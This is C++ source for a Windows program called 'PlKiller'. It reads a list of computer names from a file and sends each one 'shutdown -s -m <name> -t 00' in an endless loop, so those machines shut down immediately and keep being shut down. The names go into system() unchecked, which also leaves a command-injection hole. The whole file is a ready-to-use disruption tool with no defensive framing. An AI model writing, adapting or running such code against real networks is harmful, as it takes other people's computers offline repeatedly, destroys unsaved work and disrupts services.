#include<fstream>
#include<iostream>
using namespace std;
void killer(string);
int main(int argc,char *argv[])
{
	system("@title PlKiller 13.0.2 [Maximum]");
	cout<<"PlKiller 13.0.2 (Build 3) for Win32\n";
	cout<<"Rebuilt by Relph\n\n";
	string filnme;
	cout<<"Welcome to PlKiller.\n";
	if(argc==1)
	{
		cout<<"Filename>";
		cin>>filnme;
	}
	else
	{
		cout<<"The parameter is entered automaticlly by arg_v.\n";
		filnme=argv[1];
	}
	ifstream fin(filnme.c_str());
	int i(-1),j(0);
	string cptnme[100];
	while(!fin.eof())
		getline(fin,cptnme[++i]);
	while(1)
	{
		for(j=0;j<=i;j++)
		{
			cout<<"Killing "<<cptnme[j]<<"...\n";
			killer(cptnme[j]);
		}
	}
	return 0;
 } 
 void killer(string px)
 {
 	string ttl("shutdown -s -m "+px+" -t 00");
 	system(ttl.c_str());
 	return;
 }
